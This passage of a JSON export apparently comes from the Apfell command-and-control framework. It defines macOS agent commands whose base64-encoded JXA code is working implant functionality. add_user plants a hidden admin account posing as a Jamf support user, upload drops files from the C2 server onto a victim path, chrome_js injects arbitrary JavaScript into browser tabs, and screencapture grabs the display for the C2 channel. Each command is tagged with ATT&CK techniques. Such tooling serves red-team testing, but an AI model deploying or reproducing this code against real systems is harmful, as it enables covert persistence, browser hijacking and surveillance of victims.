          "code": "YXN5bmMgZGVmIGFwZmVsbGp4YV9zbGVlcF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6IHN0ciwgcGFyYW1ldGVyOiBOb25lKSAtPiBzdHI6CiAgICAjIGZpbmRzIHRoZSBmaWVsZCBpbmRpY2F0ZWQgYnkgJ3BhcmFtZXRlcicgYW5kIHVwZGF0ZXMgaXQgdG8gYmUgYmFzZTY0IGVuY29kZWQKICAgIGltcG9ydCBqc29uCiAgICBpZiBsZW4odGFza19wYXJhbXMpID09IDA6CiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQogICAgaWYgdGFza19wYXJhbXNbMF0gIT0gInsiOgogICAgICAgIHBpZWNlcyA9IHRhc2tfcGFyYW1zLnNwbGl0KCIgIikKICAgICAgICBpZiBsZW4ocGllY2VzKSA9PSAxOgogICAgICAgICAgICByZXR1cm4ganNvbi5kdW1wcyh7ImludGVydmFsIjogaW50KHBpZWNlc1swXSl9KQogICAgICAgIGVsaWYgbGVuKHBpZWNlcykgPT0gMjoKICAgICAgICAgICAgcmV0dXJuIGpzb24uZHVtcHMoeyJpbnRlcnZhbCI6IGludChwaWVjZXNbMF0pLCAiaml0dGVyIjogaW50KHBpZWNlc1sxXSl9KQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbigiV3JvbmcgbnVtYmVyIG9mIHBhcmFtZXRlcnMsIHNob3VsZCBiZSAxIG9yIDIiKQogICAgZWxzZToKICAgICAgICByZXR1cm4gdGFza19wYXJhbXM=",
          "name": "apfelljxa_sleep_shorthand",
          "parameter_type": "None",
          "description": "Allow users to input sleep as \"number number\" for interval and jitter",
          "is_command_code": true,
          "timestamp": "05\/07\/2020 07:01:49",
          "id": 13,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGNvbWJpbmVDb21tYW5kcyhzZWxmLCBwcmlvcl9vdXRwdXQ6IExpc3Rbc3RyXSwgcGFyYW1ldGVyOiBOb25lKSAtPiBieXRlczoKICAgICMgZXhwZWN0cyBhIGxpc3Qgb2YgY29tbWFuZHMgYW5kIHJldHVybnMgdGhlICJjb21tYW5kIiBwb3J0aW9uIG9mIGFsbCB0aGUgZmlsZXMgdG9nZXRoZXIKICAgIGNvbnRlbnQgPSBiIiIKICAgIGZvciBuIGluIHByaW9yX291dHB1dDoKICAgICAgICAjIG9ubHkgcmVhZCB1cCB1bnRpbCB0aGUgZmxhZyBDT01NQU5EX0VORFNfSEVSRQogICAgICAgIGZpbGVzID0gb3MubGlzdGRpcihzZWxmLndvcmtpbmdfZGlyICsgIi97fSIuZm9ybWF0KG4pKQogICAgICAgIGZvciBmIGluIGZpbGVzOgogICAgICAgICAgICBmaWxlX2NvbnRlbnQgPSBvcGVuKHNlbGYud29ya2luZ19kaXIgKyAiL3t9L3t9Ii5mb3JtYXQobiwgZikpLnJlYWQoKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbmRfaW5kZXggPSBmaWxlX2NvbnRlbnQuaW5kZXgoIkNPTU1BTkRfRU5EU19IRVJFIikKICAgICAgICAgICAgICAgIGZpbGVfY29udGVudCA9IGZpbGVfY29udGVudFswOmVuZF9pbmRleF0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBmaWxlX2NvbnRlbnQgPSBieXRlYXJyYXkoZmlsZV9jb250ZW50LmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgY29udGVudCArPSBmaWxlX2NvbnRlbnQKICAgIHJldHVybiBjb250ZW50",
          "name": "combineCommands",
          "parameter_type": "None",
          "description": "This combines all of the selected commands together",
          "is_command_code": false,
          "timestamp": "05\/07\/2020 07:01:49",
          "id": 9,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": true,
          "help_cmd": "add_user",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "add a local user to the system by wrapping the Apple binary, dscl.",
          "cmd": "add_user",
          "parameters": [
            {
              "type": "String",
              "hint": "P@55w0rd_here for the new user",
              "choices": "",
              "required": false,
              "name": "password"
            },
            {
              "type": "String",
              "hint": "password of the user that will execute the commands",
              "choices": "",
              "required": true,
              "name": "passwd"
            },
            {
              "type": "String",
              "hint": "username that will execute the commands",
              "choices": "",
              "required": true,
              "name": "user"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "createprofile"
            },
            {
              "type": "String",
              "hint": "\/bin\/bash",
              "choices": "",
              "required": false,
              "name": "usershell"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "primarygroupid"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "uniqueid"
            },
            {
              "type": "String",
              "hint": "\/Users\/.jamf_support",
              "choices": "",
              "required": false,
              "name": "homedir"
            },
            {
              "type": "String",
              "hint": "Jamf Support User",
              "choices": "",
              "required": false,
              "name": "realname"
            },
            {
              "type": "String",
              "hint": ".jamf_support",
              "choices": "",
              "required": false,
              "name": "username"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "hidden"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "admin"
            }
          ],
          "attack": [
            {
              "t_num": "T1136",
              "attack_name": "Create Account"
            },
            {
              "t_num": "T1169",
              "attack_name": "Sudo"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "add_user.js": "ZXhwb3J0cy5hZGRfdXNlciA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgLy8gQWRkIGEgdXNlciB3aXRoIGRzY2wgdG8gdGhlIGxvY2FsIG1hY2hpbmUKICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGxldCBhZG1pbiA9IHRydWU7CiAgICAgICAgbGV0IGhpZGRlbiA9IHRydWU7CiAgICAgICAgbGV0IHVzZXJuYW1lID0gIi5qYW1mX3N1cHBvcnQiOwogICAgICAgIGxldCBwYXNzd29yZCA9ICJQQDU1dzByZF9IZXJlIjsKICAgICAgICBsZXQgcmVhbG5hbWUgPSAiSmFtZiBTdXBwb3J0IFVzZXIiOwogICAgICAgIGxldCBob21lZGlyID0gIi9Vc2Vycy8iOwogICAgICAgIGxldCB1bmlxdWVpZCA9IDQwMzsKICAgICAgICBsZXQgcHJpbWFyeWdyb3VwaWQgPSA4MDsgLy90aGlzIGlzIHRoZSBhZG1pbiBncm91cAogICAgICAgIGxldCB1c2Vyc2hlbGwgPSAiL2Jpbi9iYXNoIjsKICAgICAgICBsZXQgY3JlYXRlcHJvZmlsZSA9IGZhbHNlOwogICAgICAgIGxldCB1c2VyID0gIiI7IC8vdXNlcm5hbWUgb2YgdGhlIHVzZXIgd2l0aCBzdWRvIGNhcGFiaWxpdHkgdG8gZG8gdGhlc2UgY29tbWFuZHMKICAgICAgICBsZXQgcGFzc3dkID0gIiI7IC8vcGFzc3dvcmQgb2YgdGhlIHVzZXIgd2l0aCBzdWRvIGNhcGFiaWxpdHkgdG8gZG8gdGhlc2UgY29tbWFuZHMKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoImFkbWluIikgJiYgdHlwZW9mIGNvbmZpZ1snYWRtaW4nXSA9PSAnYm9vbGVhbicpeyBhZG1pbiA9IGNvbmZpZ1snYWRtaW4nXTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgiaGlkZGVuIikgJiYgdHlwZW9mIGNvbmZpZ1snaGlkZGVuJ10gPT0gJ2Jvb2xlYW4nKXsgaGlkZGVuID0gY29uZmlnWydoaWRkZW4nXTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgidXNlcm5hbWUiKSAmJiBjb25maWdbJ3VzZXJuYW1lJ10gIT0gJycpeyB1c2VybmFtZSA9IGNvbmZpZ1sndXNlcm5hbWUnXTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgicGFzc3dvcmQiKSAmJiBjb25maWdbJ3Bhc3N3b3JkJ10gIT0gJycpeyBwYXNzd29yZCA9IGNvbmZpZ1sncGFzc3dvcmQnXTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgicmVhbG5hbWUiKSAmJiBjb25maWdbJ3JlYWxuYW1lJ10gIT0gJycpeyByZWFsbmFtZSA9IGNvbmZpZ1sncmVhbG5hbWUnXTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgidW5pcXVlaWQiKSAmJiBjb25maWdbJ3VuaXF1ZWlkJ10gIT0gLTEpeyB1bmlxdWVpZCA9IGNvbmZpZ1sndW5pcXVlaWQnXTsgfQogICAgICAgIGVsc2UgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCd1bmlxdWVpZCcpICYmIHR5cGVvZiBjb25maWdbJ3VuaXF1ZWlkJ10gPT0gJ3N0cmluZycgJiYgY29uZmlnWyd1bmlxdWVpZCddICE9ICcnKXsgdW5pcXVlaWQgPSBwYXJzZUludChjb25maWdbJ3VuaXF1ZWlkJ10pOyB9CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCJwcmltYXJ5Z3JvdXBpZCIpICYmIGNvbmZpZ1sncHJpbWFyeWdyb3VwaWQnXSAhPSAtMSl7IHByaW1hcnlncm91cGlkID0gY29uZmlnWydwcmltYXJ5Z3JvdXBpZCddOyB9CiAgICAgICAgZWxzZSBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ3ByaW1hcnlncm91cGlkJykgJiYgdHlwZW9mIGNvbmZpZ1sncHJpbWFyeWdyb3VwaWQnXSA9PSAnc3RyaW5nJyAmJiBjb25maWdbJ3ByaW1hcnlncm91cGlkJ10gIT0gJycpeyBwcmltYXJ5Z3JvdXBpZCA9IHBhcnNlSW50KGNvbmZpZ1sncHJpbWFyeWdyb3VwaWQnXSk7IH0KICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoInVzZXJzaGVsbCIpICYmIGNvbmZpZ1sndXNlcnNoZWxsJ10gIT0gJycpeyB1c2Vyc2hlbGwgPSBjb25maWdbJ3VzZXJzaGVsbCddOyB9CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCJjcmVhdGVwcm9maWxlIikgJiYgdHlwZW9mIGNvbmZpZ1snY3JlYXRlcHJvZmlsZSddID09ICJib29sZWFuIil7IGNyZWF0ZXByb2ZpbGUgPSBjb25maWdbJ2NyZWF0ZXByb2ZpbGUnXTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgiaG9tZWRpciIpICYmIGNvbmZpZ1snaG9tZWRpciddICE9ICcnKXsgaG9tZWRpciA9IGNvbmZpZ1snaG9tZWRpciddOyB9CiAgICAgICAgZWxzZXsgaG9tZWRpciArPSB1c2VybmFtZTsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgidXNlciIpICYmIGNvbmZpZ1sndXNlciddICE9ICcnKXsgdXNlciA9IGNvbmZpZ1sndXNlciddOyB9CiAgICAgICAgZWxzZXsgcmV0dXJuICJVc2VyJ3MgbmFtZSBpcyByZXF1aXJlZCB0byBkbyBzdWRvIGNvbW1hbmRzIjsgfQogICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgicGFzc3dkIikgJiYgY29uZmlnWydwYXNzd2QnXSAhPSAnJyl7IHBhc3N3ZCA9IGNvbmZpZ1sncGFzc3dkJ107IH0KICAgICAgICBlbHNleyByZXR1cm4gIlVzZXIncyBwYXNzd29yZCBpcyByZXF1aXJlZCB0byBkbyBzdWRvIGNvbW1hbmRzIjsgfQogICAgICAgIC8vIG5vdyBkbyBvdXIgc2VyaWVzIG9mIGRzY2wgY29tbWFuZHMgdG8gc2V0IHVwIHRoZSBhY2NvdW50CiAgICAgICAgdHJ5ewogICAgICAgICAgICBsZXQgY21kID0gImRzY2wgLiBjcmVhdGUgL1VzZXJzLyIgKyB1c2VybmFtZTsKICAgICAgICAgICAgY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsIHVzZXJOYW1lOnVzZXIsIHBhc3N3b3JkOnBhc3N3ZH0pOwogICAgICAgICAgICBpZihoaWRkZW4pewogICAgICAgICAgICAgICAgY21kID0gImRzY2wgLiBjcmVhdGUgL1VzZXJzLyIgKyB1c2VybmFtZSArICIgSXNIaWRkZW4gMSI7CiAgICAgICAgICAgICAgICBjdXJyZW50QXBwLmRvU2hlbGxTY3JpcHQoY21kLCB7YWRtaW5pc3RyYXRvclByaXZpbGVnZXM6dHJ1ZSwgdXNlck5hbWU6dXNlciwgcGFzc3dvcmQ6cGFzc3dkfSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY21kID0gImRzY2wgLiBjcmVhdGUgL1VzZXJzLyIgKyB1c2VybmFtZSArICIgVW5pcXVlSUQgIiArIHVuaXF1ZWlkOwogICAgICAgICAgICBjdXJyZW50QXBwLmRvU2hlbGxTY3JpcHQoY21kLCB7YWRtaW5pc3RyYXRvclByaXZpbGVnZXM6dHJ1ZSwgdXNlck5hbWU6dXNlciwgcGFzc3dvcmQ6cGFzc3dkfSk7CiAgICAgICAgICAgIGNtZCA9ICJkc2NsIC4gY3JlYXRlIC9Vc2Vycy8iICsgdXNlcm5hbWUgKyAiIFByaW1hcnlHcm91cElEICIgKyBwcmltYXJ5Z3JvdXBpZDsKICAgICAgICAgICAgY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsIHVzZXJOYW1lOnVzZXIsIHBhc3N3b3JkOnBhc3N3ZH0pOwogICAgICAgICAgICBjbWQgPSAiZHNjbCAuIGNyZWF0ZSAvVXNlcnMvIiArIHVzZXJuYW1lICsgIiBORlNIb21lRGlyZWN0b3J5IFwiIiArIGhvbWVkaXIgKyAiXCIiOwogICAgICAgICAgICBjdXJyZW50QXBwLmRvU2hlbGxTY3JpcHQoY21kLCB7YWRtaW5pc3RyYXRvclByaXZpbGVnZXM6dHJ1ZSwgdXNlck5hbWU6dXNlciwgcGFzc3dvcmQ6cGFzc3dkfSk7CiAgICAgICAgICAgIGNtZCA9ICJkc2NsIC4gY3JlYXRlIC9Vc2Vycy8iICsgdXNlcm5hbWUgKyAiIFJlYWxOYW1lIFwiIiArIHJlYWxuYW1lICsgIlwiIjsKICAgICAgICAgICAgY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsIHVzZXJOYW1lOnVzZXIsIHBhc3N3b3JkOnBhc3N3ZH0pOwogICAgICAgICAgICBjbWQgPSAiZHNjbCAuIGNyZWF0ZSAvVXNlcnMvIiArIHVzZXJuYW1lICsgIiBVc2VyU2hlbGwgIiArIHVzZXJzaGVsbDsKICAgICAgICAgICAgY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsIHVzZXJOYW1lOnVzZXIsIHBhc3N3b3JkOnBhc3N3ZH0pOwogICAgICAgICAgICBpZihhZG1pbil7CiAgICAgICAgICAgICAgICBjbWQgPSAiZHNlZGl0Z3JvdXAgLW8gZWRpdCAtYSAiICsgdXNlcm5hbWUgKyAiIC10IHVzZXIgYWRtaW4iOwogICAgICAgICAgICAgICAgY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsIHVzZXJOYW1lOnVzZXIsIHBhc3N3b3JkOnBhc3N3ZH0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNtZCA9ICJkc2NsIC4gcGFzc3dkIC9Vc2Vycy8iICsgdXNlcm5hbWUgKyAiIFwiIiArIHBhc3N3b3JkICsgIlwiIjsKICAgICAgICAgICAgY3VycmVudEFwcC5kb1NoZWxsU2NyaXB0KGNtZCwge2FkbWluaXN0cmF0b3JQcml2aWxlZ2VzOnRydWUsIHVzZXJOYW1lOnVzZXIsIHBhc3N3b3JkOnBhc3N3ZH0pOwogICAgICAgICAgICBpZihjcmVhdGVwcm9maWxlKXsKICAgICAgICAgICAgICAgIGNtZCA9ICJta2RpciBcIiIgKyBob21lZGlyICsgIlwiIjsKICAgICAgICAgICAgICAgIGN1cnJlbnRBcHAuZG9TaGVsbFNjcmlwdChjbWQsIHthZG1pbmlzdHJhdG9yUHJpdmlsZWdlczp0cnVlLCB1c2VyTmFtZTp1c2VyLCBwYXNzd29yZDpwYXNzd2R9KTsKICAgICAgICAgICAgICAgIGNtZCA9ICJjcCAtUiBcIi9TeXN0ZW0vTGlicmFyeS9Vc2VyIFRlbXBsYXRlL0VuZ2xpc2gubHByb2ovXCIgXCIiICsgaG9tZWRpciArICJcIiI7CiAgICAgICAgICAgICAgICBjdXJyZW50QXBwLmRvU2hlbGxTY3JpcHQoY21kLCB7YWRtaW5pc3RyYXRvclByaXZpbGVnZXM6dHJ1ZSwgdXNlck5hbWU6dXNlciwgcGFzc3dvcmQ6cGFzc3dkfSk7CiAgICAgICAgICAgICAgICBjbWQgPSAiY2hvd24gLVIgIiArIHVzZXJuYW1lICsgIjpzdGFmZiBcIiIgKyBob21lZGlyICsgIlwiIjsKICAgICAgICAgICAgICAgIGN1cnJlbnRBcHAuZG9TaGVsbFNjcmlwdChjbWQsIHthZG1pbmlzdHJhdG9yUHJpdmlsZWdlczp0cnVlLCB1c2VyTmFtZTp1c2VyLCBwYXNzd29yZDpwYXNzd2R9KTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ICJTdWNjZXNzZnVsbHkgcmFuIHRoZSBjb21tYW5kcyB0byBjcmVhdGUgdGhlIHVzZXIiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfWNhdGNoKGVycm9yKXsKICAgICAgICAgICAgcmV0dXJueyJ1c2VyX291dHB1dCI6IGVycm9yLnRvU3RyaW5nKCksICJzdGF0dXMiOiAiZXJyb3IiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBlcnJvci50b1N0cmluZygpLCAic3RhdHVzIjogImVycm9yIiwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgIH0KCn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "upload",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Upload a file to the target machine by selecting a file from your computer or specifying a file_id. \nIf you want to manually specify a \"file_id\" parameter, use the UUID associated with the file either from hosting it via the services or from another upload.",
          "cmd": "upload",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "file_id"
            },
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "file"
            },
            {
              "type": "String",
              "hint": "\/remote\/path\/on\/victim.txt",
              "choices": "",
              "required": true,
              "name": "remote_path"
            }
          ],
          "attack": [
            {
              "t_num": "T1132",
              "attack_name": "Data Encoding"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1105",
              "attack_name": "Remote File Copy"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "remote_path",
              "artifact": "File Create",
              "artifact_string": "*",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "upload.js": "ZXhwb3J0cy51cGxvYWQgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgdHJ5ewogICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgbGV0IGZ1bGxfcGF0aCAgPSBjb25maWdbJ3JlbW90ZV9wYXRoJ107CiAgICAgICAgbGV0IGRhdGEgPSAiQ2FuJ3QgZmluZCAnZmlsZScgb3IgJ2ZpbGVfaWQnIHdpdGggbm9uLWJsYW5rIHZhbHVlcyI7CiAgICAgICAgbGV0IGZpbGVfaWQgPSAiIjsKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ2ZpbGUnKSAmJiBjb25maWdbJ2ZpbGUnXSAhPT0gIiIpewogICAgICAgICAgICBkYXRhID0gQzIudXBsb2FkKHRhc2ssIGNvbmZpZ1snZmlsZSddLCAiIik7CiAgICAgICAgICAgIGZpbGVfaWQgPSBjb25maWdbJ2ZpbGUnXQogICAgICAgIH1lbHNlIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgnZmlsZV9pZCcpICYmIGNvbmZpZ1snZmlsZV9pZCddICE9PSAiIil7CiAgICAgICAgICAgIGRhdGEgPSBDMi51cGxvYWQodGFzaywgY29uZmlnWydmaWxlX2lkJ10sICIiKTsKICAgICAgICAgICAgZmlsZV9pZCA9IGNvbmZpZ1snZmlsZV9pZCddOwogICAgICAgIH0KICAgICAgICBpZih0eXBlb2YgZGF0YSA9PT0gInN0cmluZyIpewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6U3RyaW5nKGRhdGEpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgICAgICBlbHNlewogICAgICAgICAgICBkYXRhID0gd3JpdGVfZGF0YV90b19maWxlKGRhdGEsIGZ1bGxfcGF0aCk7CiAgICAgICAgICAgIHRyeXsKCSAgICAgICAgICAgIGxldCBmbSA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKCSAgICAgICAgICAgIGxldCBwaWVjZXMgPSBPYmpDLmRlZXBVbndyYXAoZm0uY29tcG9uZW50c1RvRGlzcGxheUZvclBhdGgoZnVsbF9wYXRoKSk7CgkgICAgICAgICAgICAvL2NvbnNvbGUubG9nKHBpZWNlcyk7CgkgICAgICAgICAgICBmdWxsX3BhdGggPSAiLyIgKyBwaWVjZXMuc2xpY2UoMSkuam9pbigiLyIpOwoJICAgICAgICB9Y2F0Y2goZXJyb3IpewoJICAgICAgICAgICAgcmV0dXJuIHsnc3RhdHVzJzogJ2Vycm9yJywgJ3VzZXJfb3V0cHV0JzogZXJyb3IudG9TdHJpbmcoKSwgJ2NvbXBsZXRlZCc6IHRydWV9OwoJICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjpTdHJpbmcoZGF0YSksICJjb21wbGV0ZWQiOiB0cnVlLCAnZnVsbF9wYXRoJzogZnVsbF9wYXRoLCAiZmlsZV9pZCI6IGZpbGVfaWR9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "chrome_js {\"window\": 0, \"tab\": 0, \"javascript\": \"alert(1);\"}",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to execute the specified JavaScript code into a specific browser tab. The chrome_tabs function will specify for each tab the window\/tab numbers that you can use for this function. Note: by default this ability is disabled in Chrome now, you will need to go to view->Developer->Allow JavaScript from Apple Events.",
          "cmd": "chrome_js",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "window"
            },
            {
              "type": "String",
              "hint": "javascript to execute",
              "choices": "",
              "required": true,
              "name": "javascript"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "tab"
            }
          ],
          "attack": [
            {
              "t_num": "T1106",
              "attack_name": "Execution through API"
            },
            {
              "t_num": "T1064",
              "attack_name": "Scripting"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "chrome_js.js": "ZXhwb3J0cy5jaHJvbWVfanMgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgdHJ5ewogICAgICAgIGxldCBzcGxpdF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgbGV0IHdpbmRvdyA9IHNwbGl0X3BhcmFtc1snd2luZG93J107CiAgICAgICAgbGV0IHRhYiA9IHNwbGl0X3BhcmFtc1sndGFiJ107CiAgICAgICAgbGV0IGpzY3JpcHQgPSBzcGxpdF9wYXJhbXNbJ2phdmFzY3JpcHQnXTsKICAgICAgICBpZihBcHBsaWNhdGlvbigiR29vZ2xlIENocm9tZSIpLnJ1bm5pbmcoKSl7CiAgICAgICAgICAgIGxldCByZXN1bHQgPSBBcHBsaWNhdGlvbigiR29vZ2xlIENocm9tZSIpLndpbmRvd3Nbd2luZG93XS50YWJzW3RhYl0uZXhlY3V0ZSh7amF2YXNjcmlwdDpqc2NyaXB0fSk7CiAgICAgICAgICAgIGlmKHJlc3VsdCAhPT0gdW5kZWZpbmVkKXsKICAgICAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogU3RyaW5nKHJlc3VsdCksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ImNvbXBsZXRlZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJDaHJvbWUgaXNuJ3QgcnVubmluZyIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgfQogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICBsZXQgZXJyID0gZXJyb3IudG9TdHJpbmcoKTsKCQlpZihlcnIgPT09ICJFcnJvcjogQW4gZXJyb3Igb2NjdXJyZWQuIil7CgkJICAgIGVyciArPSAiIEFwZmVsbCB3YXMgZGVuaWVkIGFjY2VzcyB0byBHb29nbGUgQ2hyb21lIChlaXRoZXIgYnkgcG9wdXAgb3IgcHJpb3IgZGVueSkuIjsKCQl9CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVyciwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "screencapture",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel. No need to specify any parameters as the current time will be used as the file name",
          "cmd": "screencapture",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1113",
              "attack_name": "Screen Capture"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "screencapture.js": "ZXhwb3J0cy5zY3JlZW5jYXB0dXJlID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIHRyeXsKICAgICAgICBPYmpDLmltcG9ydCgnQ29jb2EnKTsKICAgICAgICBPYmpDLmltcG9ydCgnQXBwS2l0Jyk7CiAgICAgICAgbGV0IGNnaW1hZ2UgPSAkLkNHRGlzcGxheUNyZWF0ZUltYWdlKCQuQ0dNYWluRGlzcGxheUlEKCkpOwogICAgICAgIGlmKGNnaW1hZ2UuanMgPT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICBjZ2ltYWdlID0gJC5DRk1ha2VDb2xsZWN0YWJsZShjZ2ltYWdlKTsgLy8gaW4gY2FzZSAxMC4xNSBpcyBtZXNzaW5nIHdpdGggdGhlIHR5cGVzIGFnYWluCiAgICAgICAgfQogICAgICAgIGlmKGNnaW1hZ2UuanMgPT09IHVuZGVmaW5lZCl7CiAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IkZhaWxlZCB0byBnZXQgaW1hZ2UgZnJvbSBkaXNwbGF5IiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICAgICAgbGV0IGJpdG1hcGltYWdlcmVwID0gJC5OU0JpdG1hcEltYWdlUmVwLmFsbG9jLmluaXRXaXRoQ